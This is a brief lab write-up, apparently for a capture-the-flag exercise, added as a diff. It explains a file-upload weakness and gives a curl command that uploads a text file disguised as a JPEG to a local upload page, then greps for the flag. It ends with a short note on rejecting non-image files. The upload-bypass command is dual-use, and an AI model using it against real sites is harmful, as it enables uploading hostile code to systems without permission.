@@ -1,0 +1,9 @@
+1) It is possible to upload different types of files and not just images.
+2) We could upload code directly in the website.
+3) Use bash for next command.
+4) curl --form "Upload=send" --header "Content-Type: multipart/form-data" --form "uploaded=@inject.txt;type=image/jpeg" LOCAL_IP/?page=upload | grep flag
+
+---
+How to avoid ?
+Only allow images to enter the folder where they are stored, if the file being inserted is not an image, simply reject the request.
+
